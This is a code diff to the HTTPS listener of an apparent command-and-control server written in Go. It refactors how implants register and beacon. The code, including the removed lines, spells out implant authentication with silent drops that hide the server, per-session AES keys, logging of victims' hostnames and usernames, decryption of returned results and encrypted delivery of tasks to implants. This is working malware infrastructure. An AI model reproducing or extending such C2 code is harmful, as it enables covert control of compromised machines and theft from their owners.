@@ -219,55 +219,13 @@ func (l *HTTPSListener) handleRegister(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Verify HMAC
-	if err := zcrypto.VerifyHMAC(l.handler.Secret, reg.ImplantId, reg.Timestamp, reg.Hmac, 30); err != nil {
-		// Silent drop
+	resp, err := HandleRegister(l.handler, reg, "https", l.resolveRemoteAddr(r))
+	if err != nil {
+		if err != ErrBeaconAuth {
+			log.Printf("[https] register error: %v", err)
+		}
 		http.NotFound(w, r)
 		return
-	}
-
-	sess := sessions.NewSession(reg, "https", l.resolveRemoteAddr(r))
-
-	// Generate AES session key
-	sessionKey, err := zcrypto.GenerateAESKey()
-	if err != nil {
-		log.Printf("[https] generate session key error: %v", err)
-		http.NotFound(w, r)
-		return
-	}
-	sess.SessionKey = sessionKey
-
-	sessionID, err := l.handler.Sessions.Register(sess)
-	if err != nil {
-		log.Printf("[https] register error: %v", err)
-		http.NotFound(w, r)
-		return
-	}
-
-	log.Printf("[https] new session: %s (implant=%s, host=%s, user=%s)",
-		sessionID, reg.ImplantId, reg.Hostname, reg.Username)
-
-	if l.handler.OnEvent != nil {
-		l.handler.OnEvent(&pb.Event{
-			Type:      pb.EventType_EVENT_SESSION_NEW,
-			Timestamp: time.Now().Unix(),
-			SessionId: sessionID,
-			Message:   fmt.Sprintf("New session from %s@%s", reg.Username, reg.Hostname),
-		})
-	}
-
-	// Encrypt session key with pre-shared secret
-	encryptedKey, err := zcrypto.AESEncrypt(l.handler.Secret, sessionKey)
-	if err != nil {
-		log.Printf("[https] encrypt session key error: %v", err)
-		encryptedKey = nil
-	}
-
-	resp := &pb.RegisterResponse{
-		Success:             true,
-		SessionId:           sessionID,
-		NextCheckinMs:       5000,
-		EncryptedSessionKey: encryptedKey,
 	}
 
 	data, _ := proto.Marshal(resp)
@@ -293,69 +251,13 @@ func (l *HTTPSListener) handleBeacon(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Verify HMAC
-	if err := zcrypto.VerifyHMAC(l.handler.Secret, beacon.ImplantId, beacon.Timestamp, beacon.Hmac, 30); err != nil {
+	resp, err := HandleBeacon(l.handler, beacon)
+	if err != nil {
+		if err != ErrBeaconAuth {
+			log.Printf("[https] beacon error: %v", err)
+		}
 		http.NotFound(w, r)
 		return
-	}
-
-	sess, ok := l.handler.Sessions.GetByImplant(beacon.ImplantId)
-	if !ok {
-		http.NotFound(w, r)
-		return
-	}
-
-	// Update checkin
-	l.handler.Sessions.UpdateCheckin(sess.SessionID)
-
-	// Process results — decrypt if encrypted
-	var results []*pb.TaskResult
-	if sess.SessionKey != nil && len(beacon.EncryptedResults) > 0 {
-		plaintext, err := zcrypto.AESDecrypt(sess.SessionKey, beacon.EncryptedResults)
-		if err != nil {
-			log.Printf("[https] decrypt results error: %v", err)
-		} else {
-			payload := &pb.BeaconResultsPayload{}
-			if err := proto.Unmarshal(plaintext, payload); err != nil {
-				log.Printf("[https] unmarshal decrypted results error: %v", err)
-			} else {
-				results = payload.Results
-			}
-		}
-	} else {
-		results = beacon.Results
-	}
-
-	for _, result := range results {
-		l.handler.Dispatcher.HandleResult(result)
-	}
-
-	// Drain pending tasks
-	pendingTasks := sess.DrainTasks()
-
-	resp := &pb.BeaconResponse{
-		NextCheckinMs: 5000,
-		Terminate:     !sess.IsAlive(),
-	}
-
-	// Encrypt tasks if session key is available
-	if sess.SessionKey != nil && len(pendingTasks) > 0 {
-		payload := &pb.BeaconTasksPayload{Tasks: pendingTasks}
-		plaintext, err := proto.Marshal(payload)
-		if err != nil {
-			log.Printf("[https] marshal tasks payload error: %v", err)
-			resp.Tasks = pendingTasks // fallback
-		} else {
-			encrypted, err := zcrypto.AESEncrypt(sess.SessionKey, plaintext)
-			if err != nil {
-				log.Printf("[https] encrypt tasks error: %v", err)
-				resp.Tasks = pendingTasks // fallback
-			} else {
-				resp.EncryptedTasks = encrypted
-			}
-		}
-	} else {
-		resp.Tasks = pendingTasks
 	}
 
 	data, _ := proto.Marshal(resp)
